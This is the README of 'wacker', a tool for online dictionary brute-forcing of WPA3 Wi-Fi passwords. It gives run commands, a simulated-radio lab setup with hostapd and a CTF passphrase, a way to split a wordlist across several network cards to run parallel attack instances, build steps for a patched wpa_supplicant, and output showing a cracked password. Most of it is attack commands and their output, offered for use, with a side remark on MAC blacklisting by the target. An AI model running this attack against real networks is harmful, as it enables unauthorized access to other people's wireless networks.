# Overview
A set of scripts to help perform an online dictionary attack against a WPA3 access point. Wacker leverages the wpa_supplicant control interface to control the operations of the supplicant daemon and to get status information and event notifications ultimately helping speedup connection attempts during brute force attempts.

NOTE: This is a modified version of original wacker.py that runs with more verbose during execution. Usage:

```
sudo python3 wacker.py -i wlan0 -b AA:BB:CC:DD:EE:FF -s MyWiFi -f FREQ -w rockyou.txt
```

# Virtual Wifi Arena
In lieu of finding a WPA3 AP for testing, consider setting up a local environment using mac80211_hwsim (details below) or by using the VMs provided by the RF Hackers Sanctuary (scoreboard.rfhackers.com).

## Local Simulated Radios
To set up your own software simulator of 802.11 radios simply configure and load the correct mac80211_hwsim module.
```
# modprobe mac80211_hwsim radios=4
# iwconfig
wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan2     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan3     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

Choose one of the new interfaces as your WPA3 access point and use the following conf file.
```
# cat hostapd.conf
interface=wlan0
ssid=WCTF_18
driver=nl80211
hw_mode=g
channel=1
logger_syslog=-1
logger_syslog_level=3
wpa=2
wpa_passphrase=Aeromechanics
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
ieee80211w=2
group_mgmt_cipher=AES-128-CMAC
```
And start hostapd with
```
# hostapd -K -dd hostapd.conf
```


# Split a wordlist
If you have intentions of farming out your cracking efforts across a series of nics the provided split.sh script will partition a wordlist for you.
```
# ./split.sh 10 cyberpunk.words 
  50916 cyberpunk.words.aaa
  50916 cyberpunk.words.aab
  50916 cyberpunk.words.aac
  50916 cyberpunk.words.aad
  50916 cyberpunk.words.aae
  50916 cyberpunk.words.aaf
  50916 cyberpunk.words.aag
  50916 cyberpunk.words.aah
  50916 cyberpunk.words.aai
  50907 cyberpunk.words.aaj
 509151 total
```


# Building wpa_supplicant
We're providing our own wpa_supplicant in order to guarantee that certain configurations are set as well as a few mods that need to occur within the source code itself.
```
# apt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev
# cp defconfig wpa_supplicant-2.10/wpa_supplicant/.config
# git apply wpa_supplicant.patch
# cd wpa_supplicant-2.10/wpa_supplicant
# make -j4
# ls -al wpa_supplicant
-rwxr-xr-x 1 root root 13541416 May 31 16:30 wpa_supplicant
```

# Python Requirement
python3.6+ is required

# Finding a target
Wacker should be seen as a complimentary tool to airodump or kismet where target selection is already performed. Wacker intentionally disables background scanning with wpa_supplicant to help speed up authentication attempts.

# Running wacker
The wacker.py script is intended to perform all the heavy lifting and requires a few specifics regarding the target.
```
# ./wacker.py --help
usage: wacker.py [-h] --wordlist WORDLIST --interface INTERFACE --bssid BSSID
                 --ssid SSID --freq FREQ [--start START_WORD] [--debug]

A WPA3 dictionary cracker. Must run as root!

optional arguments:
  -h, --help            show this help message and exit
  --wordlist WORDLIST   wordlist to use
  --interface INTERFACE
                        interface to use
  --bssid BSSID         bssid of the target
  --ssid SSID           the ssid of the WPA3 AP
  --freq FREQ           frequency of the ap
  --start START_WORD    word to start with in the wordlist
  --debug               increase logging output
```
With any luck... running the attack using just one instance...
```
# ./wacker.py --wordlist cyberpunk.words --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan2 --freq 2412
Start time: 21 Aug 2020 07:40:11
Starting wpa_supplicant...
    5795 / 509151   words (1.14%) :  79.41 words/sec : 0.020 hours lapsed :   1.76 hours to exhaust (21 Aug 2020 09:25:49)
Found the password: 'Aeromechanics'

Stop time: 21 Aug 2020 07:41:24
```

Running multiple instances of wacker is easy if you have the spare nics. Don't forget to parition the wordlist.
```
# ./wacker.py --wordlist cyberpunk.words.aaa --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan1 --freq 2412
# ./wacker.py --wordlist cyberpunk.words.aab --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan2 --freq 2412
# ./wacker.py --wordlist cyberpunk.words.aac --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan3 --freq 2412
```

# Files of interest
wacker is quite verbose. Files of interest are found under <b>/tmp/wacker/</b>
 - wlan1 : one end of the uds
 - wlan1_client : one end of the uds
 - wlan1.conf : initial wpa_supplicant conf needed
 - wlan1.log : supplicant output (only when using --debug option)
 - wlan1.pid : pid file for the wpa_supplciant instance
 - wlan1_wacker.log : wacker debug output


# Caution
wacker doesn't handle acls put in place by the target WPA3 AP. Meaning, the current code always uses the same MAC address. If the target AP blacklists our MAC address then the script won't differentiate between a true auth failure and our blacklisted MAC being rejected. This will mean that we'll consider the true password as a failure. One way to solve.... we would have to add macchanger to the source at the expense of slowdown.


# Common Problems
* You'll see this when your client driver doesn't support the correct AKM. Typically this manifests itself in the wpa_supplicant output after you try and run the wacker script. The supplicant will essentially hang waiting further instructions with the AKM issue detailed below. The needed AKM is 00-0F-AC:8 (SAE) in the cases of WPA3.

```
u631_3: WPA: AP group 0x10 network profile group 0x18; available group 0x10
u631_3: WPA: using GTK CCMP
u631_3: WPA: AP pairwise 0x10 network profile pairwise 0x18; available pairwise 0x10
u631_3: WPA: using PTK CCMP
u631_3: WPA: AP key_mgmt 0x400 network profile key_mgmt 0x400; available key_mgmt 0x400
u631_3: WPA: Failed to select authenticated key management type
u631_3: WPA: Failed to set WPA key management and encryption suites
```
